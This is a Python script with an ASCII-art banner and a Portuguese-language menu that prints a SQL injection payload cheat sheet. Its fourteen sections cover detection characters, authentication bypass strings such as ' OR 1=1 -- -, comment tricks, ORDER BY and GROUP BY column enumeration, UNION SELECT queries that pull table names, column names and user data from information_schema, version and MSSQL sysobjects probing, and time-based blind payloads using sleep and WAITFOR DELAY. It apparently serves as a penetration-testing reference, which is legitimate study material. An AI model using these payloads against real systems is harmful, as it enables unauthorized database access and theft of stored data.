import os
import textwrap
def sqlinjection():
    os.system('clear')
    print('''⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣌⠛⢦⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⠳⢤⡉⠲⣄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡞⠓⢦⡀⠀⣰⠋⠁⠀⣴⠛⢦⣬⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡿⢦⡀⠙⢾⣅⠀⣠⠞⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠞⠁⠀⠙⠳⣅⠈⠻⢧⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠀⢸⣷⣦⣄⠙⢲⡄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠀⠀⠀⠀⠀⢠⣤⠲⣦⣹⠟⠲⠟⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠃⠀⠀⠀⠀⢀⡀⢤⣭⢻⣾⠏⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⢦⡀⠀⠀⢀⡀⣈⡛⢶⣽⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠁⠀⠉⠳⣄⠘⠿⢮⣹⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠏⠀⠀⠀⠀⠰⢦⣝⣷⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⡟⠁⠀⠀⠀⠀⣇⡐⢦⣽⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠋⠀⠀⠀⠀⡆⠰⣬⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠃⠀⠀⠀⠀⢀⣛⣳⣾⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢻⣿⡆⠀⠀⢀⠈⡻⢦⣽⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣼⢯⡀⠀⠐⣿⣼⣻⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣄⡙⠳⣴⡿⣽⡿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠉⠉⠉⠁⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣼⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣰⡿⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣠⣾⠏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠰⠏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀''')
    while True:
        print("\n[1] Testes Básicos / Detecção \n[2] Quebra de String / Aspas \n[3] Bypass de Autenticação \n[4] Comentários SQL \n[5] Operações lógicas matemáticas \n[6] Operadores e Sintaxe \n[7] AND - Testes Lógicos \n[8] ORDER BY \n[9] GROUP BY \n[10] UNION SELECT \n[11] Consultas Aninhadas \n[12] Version / Enumeração \n[13] Enumeração MSSQL \n[14] Time-Based SQL injection")
        print("\nPressione Enter para sair....")
        escolha = input("\nDigite sua escolha: ").strip()
        if escolha == "1":
            os.system('clear')
            print(textwrap.dedent('''
            ===============================
            [ TESTES BÁSICOS / DETECÇÃO ]
            Objetivo: verificar se o input é vulnerável a SQL Injection
            ===============================

            '
            ''
            `
            ``
            ,
            "
            ""
            //
            \\
            ;
            %00
            '''))
        elif escolha == "2":
            os.system('clear')
            print(textwrap.dedent('''===============================
[ QUEBRA DE STRING / ASPAS ]
Objetivo: testar fechamento de strings e controle de sintaxe
===============================

' or "
' OR '1
" OR "" = "
'='
'LIKE'
'=0--+'''))
        elif escolha == "3":
            os.system('clear')
            print(textwrap.dedent('''===============================
[ BYPASS DE AUTENTICAÇÃO ]
Objetivo: forçar condição sempre verdadeira
===============================

OR 1=1
' OR 1 -- -
" OR 1 = 1 -- -
' OR '' = '
' OR 'x'='x'''))
        elif escolha == "4":
            os.system('clear')
            print(textwrap.dedent('''===============================
[ COMENTÁRIOS SQL ]
Objetivo: ignorar o restante da query original
===============================

-- -
#
/* */
;%00
`'''))
        elif escolha == "5":
            os.system('clear')
            print(textwrap.dedent('''===============================
[ OPERAÇÕES LÓGICAS / MATEMÁTICAS ]
Objetivo: avaliar resposta da aplicação a TRUE/FALSE
===============================

AND 1
AND 0
AND true
AND false
1-true
1-false
1*56
-2
AND id IS NULL; --'''))
        elif escolha == "6":
            os.system('clear')
            print(textwrap.dedent('''===============================
[ OPERADORES E SINTAXE ]
Objetivo: testar suporte do banco a concatenação e wildcards
===============================

+
||
%
@variable
@@variable'''))
        elif escolha == "7":
            os.system('clear')
            print(textwrap.dedent('''===============================
[ AND - TESTES LÓGICOS ]
Objetivo: confirmar avaliação booleana da query
===============================

AND 1
AND 0'''))
        elif escolha == "8":
            os.system('clear')
            print(textwrap.dedent('''===============================
[ ORDER BY - ENUMERAÇÃO DE COLUNAS ]
Objetivo: descobrir quantidade de colunas da query
===============================

1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+'''))
        elif escolha == "9":
            os.system('clear')
            print(textwrap.dedent('''===============================
[ GROUP BY - ENUMERAÇÃO AVANÇADA ]
Objetivo: explorar agregações e colunas
===============================

1' GROUP BY 1,2,--+
1' GROUP BY 1,2,3--+
' GROUP BY columnnames HAVING 1=1 --'''))
        elif escolha == "10":
            os.system('clear')
            print(textwrap.dedent('''===============================
[ UNION SELECT - DATABASE ]
Objetivo: identificar o banco de dados atual
===============================

' UNION SELECT 1,database()#


===============================
[ UNION SELECT - TABELAS ]
Objetivo: listar tabelas disponíveis
===============================

' UNION SELECT 1,table_name
FROM information_schema.tables
WHERE table_schema='<database>'#


===============================
[ UNION SELECT - COLUNAS ]
Objetivo: listar colunas de uma tabela
===============================

' UNION SELECT 1,column_name
FROM information_schema.columns
WHERE table_schema='<database>'
AND table_name='<tabela>'#


===============================
[ UNION SELECT - EXTRAÇÃO DE DADOS ]
Objetivo: extrair dados de tabelas conhecidas
===============================

' UNION SELECT <colunas> FROM users #
' UNION SELECT sum(columnname) FROM tablename --
-1' UNION SELECT 1,2,3--+


===============================
[ UNION SELECT - VARIÁVEIS ]
Objetivo: testar uso de variáveis SQL
===============================

-1 UNION SELECT 1 INTO @,@
-1 UNION SELECT 1 INTO @,@,@
'''))
        elif escolha == "11":
            os.system('clear')
            print(textwrap.dedent('''===============================
[ CONSULTAS ANINHADAS ]
Objetivo: testar subqueries
===============================

1 AND (SELECT * FROM Users) = 1'''))
        elif escolha == "12":
            os.system('clear')
            print(textwrap.dedent('''===============================
[ VERSION / ENUMERAÇÃO ]
Objetivo: identificar versão do banco
===============================

' AND MID(VERSION(),1,1) = '5';
'''))
        elif escolha == "13":
            os.system('clear')
            print(textwrap.dedent('''===============================
[ ENUMERAÇÃO MSSQL ]
Objetivo: localizar tabelas no SQL Server
===============================

' AND 1 IN (
  SELECT MIN(name)
  FROM sysobjects
  WHERE xtype = 'U'
  AND name > '.'
) --'''))
        elif escolha == "14":
            os.system('clear')
            print(textwrap.dedent('''===============================
[ TIME-BASED SQL INJECTION ]
Objetivo: detectar SQLi cega via atraso
===============================

(select * from (select(sleep(10)))a)
%2c(select%20*%20from%20(select(sleep(10)))a)
';WAITFOR DELAY '0:0:30'--
'''))
        elif escolha == "":
            os.system('clear')
            break
        else:
            print("[!] Entrada inválida")



